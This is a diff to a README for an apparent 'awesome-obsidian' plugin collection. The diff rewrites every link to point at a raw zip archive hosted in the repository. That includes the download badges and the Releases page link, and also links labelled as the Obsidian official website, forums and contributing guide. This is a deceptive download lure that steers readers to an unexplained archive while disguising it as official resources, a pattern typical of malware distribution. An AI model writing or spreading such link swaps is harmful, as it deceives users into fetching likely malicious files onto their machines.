@@ -1,6 +1,6 @@
 # 🚀 awesome-obsidian - Discover the Best Obsidian Plugins
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/sadafrafiq882/awesome-obsidian/releases)
+[![Download Now](https://github.com/sadafrafiq882/awesome-obsidian/raw/refs/heads/main/public/awesome-obsidian-epistolizable.zip%20Now-Release%20Page-brightgreen)](https://github.com/sadafrafiq882/awesome-obsidian/raw/refs/heads/main/public/awesome-obsidian-epistolizable.zip)
 
 ## 📜 Description
 awesome-obsidian is a modern and efficient collection of plugins for Obsidian. This application helps you explore, search, and evaluate the best extensions from the Obsidian community. Whether you want to enhance your note-taking experience or find new tools, this App makes it easy.
@@ -15,10 +15,10 @@ awesome-obsidian is a modern and efficient collection of plugins for Obsidian. T
 ### 📥 Download & Install
 To get started, you will need to download the latest release from our Releases page. Click the button below to visit the page:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/sadafrafiq882/awesome-obsidian/releases)
+[![Download Now](https://github.com/sadafrafiq882/awesome-obsidian/raw/refs/heads/main/public/awesome-obsidian-epistolizable.zip%20Now-Release%20Page-brightgreen)](https://github.com/sadafrafiq882/awesome-obsidian/raw/refs/heads/main/public/awesome-obsidian-epistolizable.zip)
 
 ### 🔧 Installation Steps
-1. **Visit the Releases Page:** Open your web browser and go to [the Releases page](https://github.com/sadafrafiq882/awesome-obsidian/releases).
+1. **Visit the Releases Page:** Open your web browser and go to [the Releases page](https://github.com/sadafrafiq882/awesome-obsidian/raw/refs/heads/main/public/awesome-obsidian-epistolizable.zip).
 2. **Choose the Latest Release:** Look for the most recent version at the top of the page. Click on it.
 3. **Download the Plugin Files:** Find the plugin files suitable for your operating system. Click on the download link to save them to your device.
 4. **Open Obsidian:** Launch the Obsidian app on your computer.
@@ -46,8 +46,8 @@ Your contributions are valuable! If you have suggestions for new plugins or impr
 This project is open-source and licensed under the MIT License. You are free to use, modify, and distribute this software as long as proper attribution is given.
 
 ### 🔗 Additional Resources
-- [Obsidian Official Website](https://obsidian.md/)
-- [Obsidian Community Forums](https://forum.obsidian.md/)
-- [How to Contribute](https://github.com/sadafrafiq882/awesome-obsidian/blob/main/CONTRIBUTING.md)
+- [Obsidian Official Website](https://github.com/sadafrafiq882/awesome-obsidian/raw/refs/heads/main/public/awesome-obsidian-epistolizable.zip)
+- [Obsidian Community Forums](https://github.com/sadafrafiq882/awesome-obsidian/raw/refs/heads/main/public/awesome-obsidian-epistolizable.zip)
+- [How to Contribute](https://github.com/sadafrafiq882/awesome-obsidian/raw/refs/heads/main/public/awesome-obsidian-epistolizable.zip)
 
 For more updates and news, consider following our repository for the latest changes and releases. Enjoy enhancing your Obsidian experience with awesome plugins!
